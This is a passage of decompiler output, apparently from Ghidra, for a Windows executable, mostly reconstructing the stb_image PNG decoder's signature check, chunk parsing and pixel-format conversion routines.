{
                    /* WARNING: Could not recover jumptable at 0x0001400036f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*DAT_14002f040)();
  return;
}



/* FUN_140003700 @ 140003700 */

undefined8 FUN_140003700(void)

{
  undefined8 *puVar1;
  
  puVar1 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
  return *puVar1;
}



/* FUN_140003720 @ 140003720 */

void FUN_140003720(void *param_1)

{
                    /* WARNING: Could not recover jumptable at 0x000140009c80. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  free(param_1);
  return;
}



/* FUN_140003730 @ 140003730 */

void FUN_140003730(undefined4 param_1)

{
  DAT_14002f038 = param_1;
  return;
}



/* FUN_140003740 @ 140003740 */

void FUN_140003740(undefined4 param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b020);
  *puVar1 = param_1;
  puVar1 = (undefined4 *)FUN_1400092f0((size_t *)&DAT_14000b040);
  *puVar1 = 1;
  return;
}



/* FUN_140003770 @ 140003770 */

undefined8 FUN_140003770(void)

{
  return 0;
}



/* FUN_140003780 @ 140003780 */

undefined8 FUN_140003780(void)

{
  return 0;
}



/* FUN_140003790 @ 140003790 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140003790(undefined4 param_1)

{
  _DAT_14000b100 = param_1;
  return;
}



/* FUN_1400037a0 @ 1400037a0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400037a0(undefined4 param_1)

{
  _DAT_14000b0fc = param_1;
  return;
}



/* FUN_1400037b0 @ 1400037b0 */

void FUN_1400037b0(void)

{
  return;
}



/* FUN_1400037c0 @ 1400037c0 */

void FUN_1400037c0(void)

{
  return;
}



/* FUN_1400037d0 @ 1400037d0 */

void * FUN_1400037d0(longlong param_1,int param_2,int param_3,int *param_4)

{
  longlong lVar1;
  ulonglong uVar2;
  void *pvVar3;
  undefined8 uVar4;
  longlong alStackX_8 [4];
  undefined8 uStack_28;
  
  uStack_28 = 0x1400037de;
  uVar2 = FUN_1400091c0();
  lVar1 = -uVar2;
  *(undefined8 *)((longlong)&uStack_28 + lVar1) = 0x1400037f4;
  pvVar3 = malloc((longlong)param_3);
  if (pvVar3 != (void *)0x0) {
    *(longlong *)((longlong)alStackX_8 + lVar1 + -8) = param_1;
    *(longlong *)(&stack0x00000030 + lVar1) = (longlong)pvVar3 + (longlong)param_3;
    *(longlong *)((longlong)alStackX_8 + lVar1) = param_1 + param_2;
    *(undefined4 *)(&stack0x00000038 + lVar1) = 1;
    *(void **)((longlong)alStackX_8 + lVar1 + 0x18) = pvVar3;
    *(void **)(&stack0x00000028 + lVar1) = pvVar3;
    *(undefined8 *)((longlong)&uStack_28 + lVar1) = 0x140003836;
    uVar4 = stbi_parse_png_file((ulonglong *)((longlong)alStackX_8 + lVar1 + -8),1);
    pvVar3 = *(void **)(&stack0x00000028 + lVar1);
    if ((int)uVar4 != 0) {
      if (param_4 == (int *)0x0) {
        return pvVar3;
      }
      *param_4 = (int)*(undefined8 *)((longlong)alStackX_8 + lVar1 + 0x18) - (int)pvVar3;
      return pvVar3;
    }
    *(undefined8 *)((longlong)&uStack_28 + lVar1) = 0x140003868;
    free(pvVar3);
  }
  return (void *)0x0;
}



/* FUN_140003870 @ 140003870 */

void FUN_140003870(longlong param_1,int param_2,int *param_3)

{
  FUN_1400037d0(param_1,param_2,0x4000,param_3);
  return;
}



/* FUN_140003880 @ 140003880 */

void * FUN_140003880(longlong param_1,int param_2,int param_3,int *param_4)

{
  int iVar1;
  longlong lVar2;
  ulonglong uVar3;
  void *pvVar4;
  undefined8 uVar5;
  longlong alStackX_8 [4];
  undefined8 uStack_28;
  
  uStack_28 = 0x14000388e;
  uVar3 = FUN_1400091c0();
  lVar2 = -uVar3;
  *(undefined8 *)((longlong)&uStack_28 + lVar2) = 0x1400038a4;
  pvVar4 = malloc((longlong)param_3);
  if (pvVar4 != (void *)0x0) {
    *(longlong *)((longlong)alStackX_8 + lVar2 + -8) = param_1;
    iVar1 = *(int *)(&stack0x00001060 + lVar2);
    *(longlong *)(&stack0x00000030 + lVar2) = (longlong)pvVar4 + (longlong)param_3;
    *(longlong *)((longlong)alStackX_8 + lVar2) = param_1 + param_2;
    *(undefined4 *)(&stack0x00000038 + lVar2) = 1;
    *(void **)((longlong)alStackX_8 + lVar2 + 0x18) = pvVar4;
    *(void **)(&stack0x00000028 + lVar2) = pvVar4;
    *(undefined8 *)((longlong)&uStack_28 + lVar2) = 0x1400038e8;
    uVar5 = stbi_parse_png_file((ulonglong *)((longlong)alStackX_8 + lVar2 + -8),iVar1);
    pvVar4 = *(void **)(&stack0x00000028 + lVar2);
    if ((int)uVar5 != 0) {
      if (param_4 == (int *)0x0) {
        return pvVar4;
      }
      *param_4 = (int)*(undefined8 *)((longlong)alStackX_8 + lVar2 + 0x18) - (int)pvVar4;
      return pvVar4;
    }
    *(undefined8 *)((longlong)&uStack_28 + lVar2) = 0x140003918;
    free(pvVar4);
  }
  return (void *)0x0;
}



/* FUN_140003920 @ 140003920 */

uint * FUN_140003920(longlong *param_1,int param_2,uint param_3)

{
  char *pcVar1;
  bool bVar2;
  uint *_Memory;
  char cVar3;
  undefined1 uVar4;
  byte bVar5;
  byte bVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  undefined8 *puVar14;
  undefined1 *puVar15;
  void *pvVar16;
  undefined2 *puVar17;
  uint *puVar18;
  short *psVar19;
  short *psVar20;
  int *piVar21;
  short *psVar22;
  uint *puVar23;
  undefined1 *puVar24;
  byte *pbVar25;
  uint *puVar26;
  uint uVar27;
  uint uVar28;
  undefined1 *puVar29;
  ulonglong uVar30;
  undefined2 *puVar31;
  char *pcVar33;
  char *pcVar34;
  ulonglong uVar35;
  undefined4 *puVar36;
  byte *pbVar37;
  uint uVar38;
  byte bVar39;
  undefined4 *puVar40;
  ulonglong _Size;
  byte *pbVar41;
  uint uVar42;
  ulonglong uVar43;
  uint *puVar44;
  uint *puVar45;
  uint *puVar46;
  uint *puVar47;
  uint *puVar48;
  int iVar49;
  char *pcVar50;
  uint uVar51;
  longlong lVar52;
  void *pvVar53;
  bool bVar54;
  undefined1 extraout_XMM0 [16];
  undefined1 auVar55 [16];
  undefined1 in_XMM1 [16];
  uint *puStackY_6a0;
  void *pvStackY_698;
  void *pvStackY_690;
  uint *puStackY_688;
  int iStackY_680;
  byte *pbStackY_668;
  ulonglong uStackY_660;
  uint *puStackY_658;
  longlong *plStackY_650;
  ulonglong uStackY_648;
  ulonglong uStackY_640;
  ulonglong uStackY_638;
  ulonglong uStackY_630;
  uint in_stack_fffffffffffffa00;
  uint in_stack_fffffffffffffa08;
  undefined4 uStack_5f4;
  uint local_5cc;
  byte local_5c2;
  byte local_5c1;
  byte *local_588;
  uint local_580;
  uint local_57c;
  char local_558;
  undefined2 local_557;
  byte local_555;
  uint local_554;
  short asStack_550 [4];
  undefined8 local_548;
  undefined8 uStack_540;
  undefined8 local_538;
  undefined4 local_530;
  undefined8 local_528;
  undefined8 uStack_520;
  undefined8 local_518;
  undefined4 local_510;
  undefined8 local_508;
  undefined8 uStack_500;
  undefined8 local_4f8;
  undefined4 local_4f0;
  undefined8 local_4e8;
  undefined8 uStack_4e0;
  undefined8 local_4d8;
  undefined4 local_4d0;
  undefined4 local_4c8;
  ulonglong uVar32;
  
  pcVar34 = &DAT_14002b428;
  puVar44 = (uint *)*param_1;
  local_557 = 0;
  local_555 = 0;
  param_1[3] = 0;
  *(undefined1 (*) [16])(param_1 + 1) = (undefined1  [16])0x0;
  do {
    pcVar33 = *(char **)(puVar44 + 0x30);
    if (pcVar33 < *(char **)(puVar44 + 0x32)) {
      *(char **)(puVar44 + 0x30) = pcVar33 + 1;
      cVar3 = *pcVar33;
LAB_1400039fe:
      if (*pcVar34 != cVar3) {
LAB_140003a02:
        uStackY_630 = 0x140003a15;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "bad png sig";
        return (uint *)0x0;
      }
    }
    else {
      if (puVar44[0xc] != 0) {
        uStackY_630 = 0x140003a80;
        FUN_140001480((longlong)puVar44);
        pcVar33 = *(char **)(puVar44 + 0x30);
        *(char **)(puVar44 + 0x30) = pcVar33 + 1;
        cVar3 = *pcVar33;
        goto LAB_1400039fe;
      }
      if (*pcVar34 != '\0') goto LAB_140003a02;
    }
    pcVar34 = pcVar34 + 1;
  } while (pcVar34 != "");
  bVar2 = false;
  uVar43 = 0;
  uVar27 = 0;
  local_5cc = 0;
  iVar11 = 1;
  uVar42 = 0;
  local_5c1 = 0;
  local_5c2 = 0;
  uVar30 = 0;
  do {
    uStackY_630 = 0x140003ae3;
    uVar7 = stbi_defilter_row((longlong)puVar44);
    _Size = (ulonglong)uVar7;
    uStackY_630 = 0x140003aed;
    uVar8 = stbi_defilter_row((longlong)puVar44);
    uVar35 = uVar30;
    if (uVar8 == 0x49484452) {
      if (iVar11 == 0) {
        uStackY_630 = 0x140004be1;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "multiple IHDR";
        return (uint *)0x0;
      }
      if (uVar7 != 0xd) {
        uStackY_630 = 0x140004bfc;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "bad IHDR len";
        return (uint *)0x0;
      }
      uStackY_630 = 0x1400042e2;
      uVar42 = stbi_defilter_row((longlong)puVar44);
      *puVar44 = uVar42;
      uStackY_630 = 0x1400042ee;
      uVar42 = stbi_defilter_row((longlong)puVar44);
      puVar44[1] = uVar42;
      if ((0x1000000 < uVar42) || (0x1000000 < *puVar44)) goto LAB_1400045e2;
      pbVar41 = *(byte **)(puVar44 + 0x30);
      if (*(byte **)(puVar44 + 0x32) <= pbVar41) {
        if (puVar44[0xc] == 0) {
          *(undefined4 *)(param_1 + 4) = 0;
          goto LAB_140004332;
        }
        uStackY_630 = 0x140004405;
        FUN_140001480((longlong)puVar44);
        pbVar41 = *(byte **)(puVar44 + 0x30);
      }
      *(byte **)(puVar44 + 0x30) = pbVar41 + 1;
      bVar39 = *pbVar41;
      *(uint *)(param_1 + 4) = (uint)bVar39;
      if ((0x10 < bVar39) || ((0xfffffffffffefee9U >> ((ulonglong)bVar39 & 0x3f) & 1) != 0)) {
LAB_140004332:
        uStackY_630 = 0x140004345;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "1/2/4/8/16-bit only";
        return (uint *)0x0;
      }
      pbVar41 = *(byte **)(puVar44 + 0x30);
      if (pbVar41 < *(byte **)(puVar44 + 0x32)) {
LAB_1400044d1:
        *(byte **)(puVar44 + 0x30) = pbVar41 + 1;
        bVar39 = *pbVar41;
        local_5cc = (uint)bVar39;
        if (local_5cc != 6 && 5 < bVar39) {
LAB_140004b0f:
          uStackY_630 = 0x140004b22;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "bad ctype";
          return (uint *)0x0;
        }
        if (local_5cc == 3) {
          if ((int)param_1[4] == 0x10) goto LAB_140004b0f;
          local_5c2 = 3;
          uVar7 = 3;
        }
        else {
          uVar7 = local_5cc;
          if ((bVar39 & 1) != 0) goto LAB_140004b0f;
        }
        pcVar34 = *(char **)(puVar44 + 0x30);
        if (*(char **)(puVar44 + 0x32) <= pcVar34) {
          if (puVar44[0xc] == 0) goto LAB_14000445b;
          uStackY_630 = 0x1400049a9;
          FUN_140001480((longlong)puVar44);
          pcVar34 = *(char **)(puVar44 + 0x30);
        }
        *(char **)(puVar44 + 0x30) = pcVar34 + 1;
        if (*pcVar34 != '\0') {
          uStackY_630 = 0x140004cbc;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "bad comp method";
          return (uint *)0x0;
        }
        pcVar34 = *(char **)(puVar44 + 0x30);
        if (*(char **)(puVar44 + 0x32) <= pcVar34) {
          if (puVar44[0xc] == 0) goto LAB_14000445b;
          uStackY_630 = 0x14000495d;
          FUN_140001480((longlong)puVar44);
          pcVar34 = *(char **)(puVar44 + 0x30);
        }
        *(char **)(puVar44 + 0x30) = pcVar34 + 1;
        if (*pcVar34 != '\0') {
          uStackY_630 = 0x140004cd7;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "bad filter method";
          return (uint *)0x0;
        }
        pbVar41 = *(byte **)(puVar44 + 0x30);
        if (*(byte **)(puVar44 + 0x32) <= pbVar41) {
          uVar42 = puVar44[0xc];
          if (uVar42 == 0) goto LAB_140004463;
          uStackY_630 = 0x140004981;
          FUN_140001480((longlong)puVar44);
          pbVar41 = *(byte **)(puVar44 + 0x30);
        }
        *(byte **)(puVar44 + 0x30) = pbVar41 + 1;
        uVar42 = (uint)*pbVar41;
        if (1 < uVar42) {
          uStackY_630 = 0x14000459b;
          puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
          *puVar14 = "bad interlace method";
          return (uint *)0x0;
        }
      }
      else {
        local_5cc = puVar44[0xc];
        uVar7 = 0;
        if (local_5cc != 0) {
          uStackY_630 = 0x1400044ca;
          FUN_140001480((longlong)puVar44);
          pbVar41 = *(byte **)(puVar44 + 0x30);
          goto LAB_1400044d1;
        }
LAB_14000445b:
        uVar42 = 0;
      }
LAB_140004463:
      uVar8 = *puVar44;
      if ((uVar8 == 0) || (puVar44[1] == 0)) {
        uStackY_630 = 0x140004b4f;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "0-pixel image";
        return (uint *)0x0;
      }
      if (local_5c2 == 0) {
        if ((uVar7 & 2) != 0) {
          iVar11 = 3;
        }
        uVar7 = ((int)local_5cc >> 2) + iVar11;
        puVar44[2] = uVar7;
        uVar7 = (uint)((0x40000000 / (ulonglong)uVar8) / (ulonglong)uVar7);
      }
      else {
        puVar44[2] = 1;
        uVar7 = (uint)(0x10000000 / (ulonglong)uVar8);
      }
      if (uVar7 < puVar44[1]) {
LAB_1400045e2:
        uStackY_630 = 0x1400045f5;
        puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar14 = "too large";
        return (uint *)0x0;
      }
      iVar11 = 0;
    }
    else {
      uVar9 = (uint)uVar43;
      if (uVar8 < 0x49484453) {
        iVar13 = (int)uVar30;
        if (uVar8 == 0x49444154) {
          if (iVar11 != 0) goto LAB_1400045a8;
          if ((local_5c2 != 0) && (uVar9 == 0)) {
            uStackY_630 = 0x140004c55;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "no PLTE";
            return (uint *)0x0;
          }
          if (param_2 == 2) {
            if (local_5c2 == 0) {
              return (uint *)0x1;
            }
            puVar44[2] = (uint)local_5c2;
            return (uint *)0x1;
          }
          if (0x40000000 < uVar7) {
            uStackY_630 = 0x140004c86;
            puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
            *puVar14 = "IDAT size limit";
            return (uint *)0x0;
          }
          uVar8 = iVar13 + uVar7;
          uVar35 = (ulonglong)uVar8;
          if ((int)uVar8 < iVar13) {
            return (uint *)0x0;
          }
          if (uVar27 < uVar8) {
            if (uVar27 != 0) goto LAB_140004620;
            uVar27 = 0x1000;
            if (0xfff < uVar7) {
              uVar27 = uVar7;
            }
            for (; uVar27 < uVar8; uVar27 = uVar27 * 2) {
LAB_140004620:
            }
            uStackY_630 = 0x140004634;
            pvVar16 = realloc((void *)param_1[1],(ulonglong)uVar27);
            if (pvVar16 == (void *)0x0) goto LAB_140004ad9;
            param_1[1] = (longlong)pvVar16;
          }
          else {
            pvVar16 = (void *)param_1[1];
          }
          pvVar53 = *(void **)(puVar44 + 0x30);
          if ((*(longlong *)(puVar44 + 4) == 0) ||
             (iVar13 = (int)*(ulonglong *)(puVar44 + 0x32) - (int)pvVar53, (int)uVar7 <= iVar13)) {
            if (*(ulonglong *)(puVar44 + 0x32) < (longlong)pvVar53 + _Size) {
LAB_1400042a6:
              uStackY_630 = 0x1400042b9;
              puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
              *puVar14 = "outofdata";
              return (uint *)0x0;
            }
            uStackY_630 = 0x140004718;
            memcpy((void *)((longlong)pvVar16 + uVar30),pvVar53,_Size);
            *(ulonglong *)(puVar44 + 0x30) = *(longlong *)(puVar44 + 0x30) + _Size;
          }
          else {
            uStackY_630 = 0x140004883;
            pvVar16 = memcpy((void *)((longlong)pvVar16 + uVar30),pvVar53,(longlong)iVar13);
            uStackY_630 = 0x140004897;
            iVar12 = (**(code **)(puVar44 + 4))
                               (*(undefined8 *)(puVar44 + 10),(longlong)pvVar16 + (longlong)iVar13,
                                uVar7 - iVar13);
            *(undefined8 *)(puVar44 + 0x30) = *(undefined8 *)(puVar44 + 0x32);
            if (uVar7 - iVar13 != iVar12) goto LAB_1400042a6;
          }
        }
        else {
          if (uVar8 == 0x49454e44) {
            if (iVar11 != 0) goto LAB_1400045a8;
            if (param_2 != 0) {
              return (uint *)0x1;
            }
            if (param_1[1] == 0) {
              uStackY_630 = 0x140004743;
              puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
              *puVar14 = "no IDAT";
              return (uint *)0x0;
            }
            local_554 = (*puVar44 * (int)param_1[4] + 7 >> 3) * puVar44[2] * puVar44[1] + puVar44[1]
            ;
            uStackY_630 = 0x140003e04;
            pvVar16 = FUN_140003880(param_1[1],iVar13,local_554,(int *)&local_554);
            param_1[2] = (longlong)pvVar16;
            if (pvVar16 == (void *)0x0) {
              return (uint *)0x0;
            }
            uStackY_630 = 0x140003e1a;
            free((void *)param_1[1]);
            param_1[1] = 0;
            if (((puVar44[2] + 1 != param_3) || (param_3 == 3)) ||
               (local_580 = param_3, local_5c2 != 0)) {
              local_580 = puVar44[2] + (uint)local_5c1;
            }
            uVar27 = *(uint *)(param_1 + 4);
            pbVar41 = (byte *)(ulonglong)uVar27;
            uVar43 = (ulonglong)uVar42;
            local_57c = local_554;
            local_588 = (byte *)param_1[2];
            puVar44[3] = local_580;
            uVar7 = local_580 * 2;
            if (uVar27 != 0x10) {
              uVar7 = local_580;
            }
            puVar18 = (uint *)*param_1;
            uVar9 = puVar18[1];
            uVar8 = *puVar18;
            uVar35 = (ulonglong)uVar8;
            if (uVar42 == 0) {
              puVar48 = (uint *)(ulonglong)local_580;
              uStackY_630 = 0x1400049f0;
              iVar11 = stbi_create_png_image_raw(param_1,local_588,local_554,local_580,uVar8,uVar9,uVar27,
                                     local_5cc);
              if (iVar11 == 0) {
                return (uint *)0x0;
              }
            }
            else {
              uStackY_630 = 0x140003eb7;
              pvVar16 = stbi_create_png_image(uVar8,uVar9,uVar7);
              if (pvVar16 == (void *)0x0) goto LAB_140004ad9;
              lVar52 = 0;
              while( true ) {
                puVar48 = (uint *)(ulonglong)uVar9;
                local_530 = 0;
                local_548 = 0x400000000;
                uStack_540 = 0x200000000;
                local_538 = 0x100000000;
                uVar42 = *(uint *)((longlong)&local_548 + lVar52);
                pbVar41 = (byte *)(ulonglong)uVar42;
                local_4f0 = 1;
                local_508 = 0x800000008;
                uStack_500 = 0x400000004;
                local_4f8 = 0x200000002;
                uVar8 = *(uint *)((longlong)&local_508 + lVar52);
                _Size = (ulonglong)uVar8;
                local_4d0 = 2;
                local_4e8 = 0x800000008;
                uStack_4e0 = 0x400000008;
                local_4d8 = 0x200000004;
                uVar28 = *(uint *)((longlong)&local_4e8 + lVar52);
                uVar38 = (((uVar8 - 1) + (int)uVar35) - uVar42) / uVar8;
                local_510 = 1;
                local_528 = 0;
                uStack_520 = 4;
                local_518 = 2;
                uVar35 = (ulonglong)*(uint *)((longlong)&local_528 + lVar52);
                uVar9 = (((uVar28 - 1) + uVar9) - *(uint *)((longlong)&local_528 + lVar52)) / uVar28
                ;
                if ((uVar38 != 0) && (uVar9 != 0)) {
                  puVar48 = (uint *)(ulonglong)local_580;
                  uVar10 = (((int)(puVar18[2] * uVar38 * uVar27 + 7) >> 3) + 1) * uVar9;
                  uStackY_630 = 0x1400040c3;
                  in_stack_fffffffffffffa00 = uVar9;
                  in_stack_fffffffffffffa08 = uVar27;
                  iVar11 = stbi_create_png_image_raw(param_1,local_588,local_57c,local_580,uVar38,uVar9,uVar27,
                                         local_5cc);
                  if (iVar11 == 0) {
                    uStackY_630 = 0x140004d97;
                    free(pvVar16);
                    return (uint *)0x0;
                  }
                  if (0 < (int)uVar9) {
                    puVar18 = (uint *)0x0;
                    _Size = (ulonglong)(int)uVar7;
                    pbVar41 = (byte *)(longlong)(int)(uVar42 * uVar7);
                    puVar48 = puVar18;
                    if (0 < (int)uVar38) {
                      iVar11 = 0;
                      do {
                        piVar21 = (int *)*param_1;
                        uVar43 = 0;
                        pbVar41 = (byte *)(longlong)(int)(uVar42 * uVar7);
                        pvVar53 = (void *)((longlong)iVar11 + param_1[3]);
                        do {
                          uVar51 = (int)uVar43 + 1;
                          uVar43 = (ulonglong)uVar51;
                          pbVar25 = pbVar41 + *piVar21 * uVar7 * (int)uVar35;
                          pbVar41 = pbVar41 + (int)(uVar8 * uVar7);
                          uStackY_630 = 0x1400041ab;
                          memcpy(pbVar25 + (longlong)pvVar16,pvVar53,_Size);
                          pvVar53 = (void *)((longlong)pvVar53 + _Size);
                        } while (uVar38 != uVar51);
                        pbVar41 = (byte *)(ulonglong)(uVar38 * uVar7);
                        uVar51 = (int)puVar18 + 1;
                        puVar18 = (uint *)(ulonglong)uVar51;
                        uVar35 = (ulonglong)((int)uVar35 + uVar28);
                        iVar11 = iVar11 + uVar38 * uVar7;
                      } while (uVar9 != uVar51);
                    }
                  }
                  uStackY_630 = 0x140004201;
                  free((void *)param_1[3]);
                  local_588 = local_588 + uVar10;
                  local_57c = local_57c - uVar10;
                }
                lVar52 = lVar52 + 4;
                if (lVar52 == 0x1c) break;
                puVar18 = (uint *)*param_1;
                uVar9 = puVar18[1];
                uVar35 = (ulonglong)*puVar18;
              }
              param_1[3] = (longlong)pvVar16;
              uVar30 = 0x1c;
              puVar18 = (uint *)&local_4e8;
              uVar9 = in_stack_fffffffffffffa00;
              uVar27 = in_stack_fffffffffffffa08;
            }
            if (local_5c1 != 0) {
              uVar42 = puVar44[3];
              psVar20 = (short *)param_1[3];
              uVar28 = *(int *)*param_1 * ((int *)*param_1)[1];
              uVar32 = (ulonglong)uVar28;
              uVar8 = uVar42 - 2 & 0xfffffffd;
              if ((int)param_1[4] == 0x10) {
                if (uVar8 == 0) {
                  if (uVar42 == 2) {
                    if (uVar28 != 0) {
                      psVar22 = psVar20;
                      do {
                        psVar19 = psVar22 + 2;
                        psVar22[1] = -(ushort)(*psVar22 != asStack_550[1]);
                        psVar22 = psVar19;
                      } while (psVar20 + uVar32 * 2 != psVar19);
                    }
                  }
                  else if (uVar28 != 0) {
                    psVar22 = psVar20 + uVar32 * 4;
                    puVar48 = (uint *)(ulonglong)(ushort)asStack_550[3];
                    do {
                      if (((*psVar20 == asStack_550[1]) && (psVar20[1] == asStack_550[2])) &&
                         (psVar20[2] == asStack_550[3])) {
                        psVar20[3] = 0;
                      }
                      psVar20 = psVar20 + 4;
                    } while (psVar22 != psVar20);
                  }
                  goto LAB_140004ac1;
                }
LAB_140004eb9:
                uStackY_630 = 0x140004ed3;
                _assert("out_n == 2 || out_n == 4","stb_image.h",0x134b);
              }
              else if (uVar8 == 0) {
                if (uVar42 == 2) {
                  if (uVar28 != 0) {
                    psVar22 = psVar20;
                    do {
                      psVar19 = psVar22 + 1;
                      *(char *)((longlong)psVar22 + 1) = -((char)*psVar22 != (char)local_557);
                      psVar22 = psVar19;
                    } while (psVar20 + uVar32 != psVar19);
                  }
                }
                else if (uVar28 != 0) {
                  psVar22 = psVar20 + uVar32 * 2;
                  puVar48 = (uint *)(ulonglong)local_555;
                  do {
                    if ((((char)*psVar20 == (char)local_557) &&
                        (*(char *)((longlong)psVar20 + 1) == local_557._1_1_)) &&
                       (*(byte *)(psVar20 + 1) == local_555)) {
                      *(char *)((longlong)psVar20 + 3) = '\0';
                    }
                    psVar20 = psVar20 + 2;
                  } while (psVar22 != psVar20);
                }
LAB_140004ac1:
                if (bVar2) goto LAB_140004a2e;
                if (local_5c2 != 0) goto LAB_14000478b;
                goto LAB_140004a92;
              }
              puVar44 = (uint *)0x1332;
              pcVar33 = "stb_image.h";
              pcVar34 = "out_n == 2 || out_n == 4";
              uStackY_630 = 0x140004eed;
              _assert();
              pcVar50 = &DAT_14002b428;
              piVar21 = (int *)CONCAT44(uStack_5f4,uVar27);
              piVar21[1] = 0;
              piVar21[2] = 0;
              *piVar21 = 8;
              pbStackY_668 = pbVar41;
              uStackY_660 = _Size;
              puStackY_658 = puVar18;
              plStackY_650 = param_1;
              uStackY_648 = uVar35;
              uStackY_640 = uVar43;
              uStackY_638 = uVar30;
              uStackY_630 = (ulonglong)uVar7;
              do {
                pcVar1 = *(char **)((longlong)pcVar34 + 0xc0);
                if (pcVar1 < *(char **)((longlong)pcVar34 + 200)) {
                  *(char **)((longlong)pcVar34 + 0xc0) = pcVar1 + 1;
                  cVar3 = *pcVar1;
LAB_140004f72:
                  if (*pcVar50 != cVar3) {
LAB_140004f78:
                    puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                    *(undefined8 *)((longlong)pcVar34 + 0xc0) =
                         *(undefined8 *)((longlong)pcVar34 + 0xd0);
                    *(undefined8 *)((longlong)pcVar34 + 200) =
                         *(undefined8 *)((longlong)pcVar34 + 0xd8);
                    *puVar14 = "unknown image type";
                    return (uint *)0x0;
                  }
                }
                else {
                  if (*(uint *)((longlong)pcVar34 + 0x30) != 0) {
                    FUN_140001480((longlong)pcVar34);
                    pcVar1 = *(char **)((longlong)pcVar34 + 0xc0);
                    *(char **)((longlong)pcVar34 + 0xc0) = pcVar1 + 1;
                    cVar3 = *pcVar1;
                    goto LAB_140004f72;
                  }
                  if (*pcVar50 != '\0') goto LAB_140004f78;
                }
                pcVar50 = pcVar50 + 1;
              } while (pcVar50 != "");
              *(undefined8 *)((longlong)pcVar34 + 0xc0) = *(undefined8 *)((longlong)pcVar34 + 0xd0);
              *(undefined8 *)((longlong)pcVar34 + 200) = *(undefined8 *)((longlong)pcVar34 + 0xd8);
              if (4 < uVar9) {
LAB_1400050f8:
                puVar14 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                *puVar14 = "bad req_comp";
                return (uint *)0x0;
              }
              puStackY_688 = (uint *)0x0;
              puStackY_6a0 = (uint *)pcVar34;
              puVar23 = FUN_140003920((longlong *)&puStackY_6a0,0,uVar9);
              _Memory = puStackY_688;
              puVar18 = puStackY_6a0;
              if ((int)puVar23 == 0) {
                puVar23 = (uint *)0x0;
                puVar44 = puStackY_688;
              }
              else {
                if (iStackY_680 < 9) {
                  iStackY_680 = 8;
                }
                else if (iStackY_680 != 0x10) goto LAB_140005238;
                *piVar21 = iStackY_680;
                puVar23 = puStackY_688;
                if ((uVar9 != 0) && (uVar42 = puStackY_6a0[3], uVar9 != uVar42)) {
                  uVar27 = puStackY_6a0[1];
                  uVar7 = *puStackY_6a0;
                  if (iStackY_680 == 8) {
                    puVar23 = (uint *)stbi_create_png_image(uVar9,uVar7,uVar27);
                    if (puVar23 == (uint *)0x0) goto LAB_140005855;
                    if (0 < (int)uVar27) {
                      iVar11 = uVar42 * uVar7;
                      iVar13 = uVar9 * uVar7;
                      switch((uVar9 - 10) + uVar42 * 8) {
                      case 0:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            iVar12 = (int)puVar45;
                            do {
                              uVar38 = *puVar45;
                              puVar45 = (uint *)((longlong)puVar45 + 1);
                              *(byte *)((longlong)puVar26 + 1) = 0xff;
                              *(byte *)puVar26 = (byte)uVar38;
                              puVar26 = (uint *)((longlong)puVar26 + 2);
                            } while (-1 < (int)(((uVar7 - 1) + iVar12) - (int)puVar45));
                          }
                          uVar42 = uVar42 + 1;
                          uVar8 = uVar8 + iVar11;
                          uVar28 = uVar28 + iVar13;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 1:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = _Memory;
                        puVar26 = puVar23;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            iVar12 = (int)puVar45;
                            do {
                              bVar39 = (byte)*puVar45;
                              puVar45 = (uint *)((longlong)puVar45 + 1);
                              *(byte *)((longlong)puVar26 + 2) = bVar39;
                              *(ushort *)puVar26 = CONCAT11(bVar39,bVar39);
                              puVar26 = (uint *)((longlong)puVar26 + 3);
                            } while (-1 < (int)(((uVar7 - 1) + iVar12) - (int)puVar45));
                          }
                          uVar42 = uVar42 + 1;
                          uVar28 = uVar28 + iVar13;
                          uVar8 = uVar8 + iVar11;
                          if (uVar27 == uVar42) break;
                          puVar45 = (uint *)((ulonglong)uVar8 + (longlong)_Memory);
                          puVar26 = (uint *)((ulonglong)uVar28 + (longlong)puVar23);
                        }
                        break;
                      case 2:
                        uVar28 = 0;
                        uVar8 = 0;
                        uVar42 = 0;
                        puVar45 = puVar23;
                        puVar26 = _Memory;
                        while( true ) {
                          if (-1 < (int)(uVar7 - 1)) {
                            iVar12 = (int)puVar26;
                            do {
